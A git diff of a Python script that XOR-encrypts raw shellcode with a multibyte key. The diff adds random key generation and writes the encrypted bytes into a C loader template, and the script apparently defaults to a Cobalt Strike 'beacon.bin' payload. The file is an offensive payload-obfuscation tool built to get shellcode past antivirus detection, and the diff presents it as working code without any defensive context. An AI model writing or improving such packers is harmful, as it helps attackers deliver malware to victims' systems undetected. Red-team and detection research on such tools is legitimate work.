@@ -3,6 +3,8 @@ This script uses XOR with a multibyte key to encrypt a raw shellcode file.
 '''
 import sys
 import argparse
+import random
+import string
 	
 def repeated_key_xor(input_text, key):
     """Returns message XOR'd with a key. If the message is longer
@@ -45,23 +47,28 @@ def get_raw_sc(input_file):
         exit("\n\nThe input file you specified does not exist! Please specify a valid file path.\nExiting...\n")
 
 		
-def DoBinary(input_file, key):
-	# read our raw shellcode
-    raw_sc = get_raw_sc(input_file)
-	
+def DoBinary(raw_sc, key):
     key_bytes = bytes(key, 'UTF8')
     encrypted_shellcode = repeated_key_xor(raw_sc, key_bytes).hex()
 
     final_shellcode = format_shellcode(encrypted_shellcode)
-    with open('outfile.txt', 'w') as outfile:
-        outfile.write(final_shellcode)
-        sys.exit(0)
+    return final_shellcode
+
+
+def build_template(shellcode, shellcode_length, key):
+    with open("xor_multibyte_key_template.c") as tplate:
+        template = tplate.read()
+        template = template.replace("###SC_LENGTH###", str(shellcode_length))
+        template = template.replace("###SHELLCODE###", shellcode)
+        template = template.replace("###XORKEY###", key)
+
+    with open("xor-multibyte-key.c", "w") as outfile:
+        outfile.write(template)
+
 
 def main():
     ### Parse our arguments
     parser = argparse.ArgumentParser()
-    parser.add_argument("-k", "--key", type=str,
-                        help="Cipher key. Key should not contains spaces.")
     parser.add_argument("-i", "--input", type=str,
                         help="Payload to be encrypted.")
 
@@ -71,15 +78,26 @@ def main():
         parser.print_help(sys.stderr)
         sys.exit(0)
 
-    if not args.key:
-        args.key = "XORKEY"
-
     if args.input:
         input_file = args.input
     else:
         input_file = "beacon.bin"
 
-    shellcode = DoBinary(input_file, args.key)
+    # Generate key
+    key = ''.join(random.choices(string.ascii_uppercase, k=16))
+
+    # Read raw shellcode
+    raw_sc = get_raw_sc(input_file)
+
+    shellcode = DoBinary(raw_sc, key)
+    build_template(shellcode, len(raw_sc), key)
+
+    original_shellcode = ""
+    for byte in raw_sc:
+        original_shellcode = original_shellcode + str(hex(byte).zfill(2)) + ", "
+    original_shellcode = original_shellcode.rstrip(', ')
+    print("Original shellcode:")
+    print(original_shellcode)
 
 
 if __name__ == '__main__':
